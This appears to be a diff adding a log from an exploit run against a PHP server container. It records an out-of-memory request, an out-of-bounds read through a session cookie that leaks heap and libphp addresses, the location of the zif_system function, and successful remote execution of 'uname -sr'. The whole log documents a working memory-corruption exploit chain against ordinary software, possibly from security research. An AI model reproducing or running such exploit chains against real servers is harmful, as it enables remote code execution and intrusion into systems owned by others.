@@ -1,0 +1,15 @@
+
+=== 2026-10-23T13:39:38.401882+00:00 ===
+[*] exec: uname -sr
+[*] restarting container p2s-8335 for fresh ASLR
+[try 1/3] A1: END-cleanup send_cookie OOM
+      A1 body generated; sending chunked END-cleanup OOM
+      A1 -> status='HTTP/1.0 500 Internal Server Error' bytes=211 set-cookie=none
+      B1 body generated; sending chunked stale-id OOB read
+      B1 -> status='HTTP/1.1 200 OK' bytes=1260683 set-cookie=[1260464]
+      decoded=819208 zval_ptr_dtor=0x7f4efbd08c50 -> libphp=0x7f4efb86a000
+      chunk buckets: [('0x7f4ef1c00000', 3527), ('0x7f4efbc00000', 1168), ('0x7f4ef2600000', 165)]
+      dtor anchor: bucket=0x7f4efbc00000 carrier_chunk=0x7f4ef9c00000
+[try 1] A2 + B2 (1/1): base=0x7f4ef9c00000 S=0x7f4ef9cf9398 zif_system=0x7f4efbc16080
+[+] output (/out/o665d2879):
+Linux 5.15.153.1-microsoft-standard-WSL2
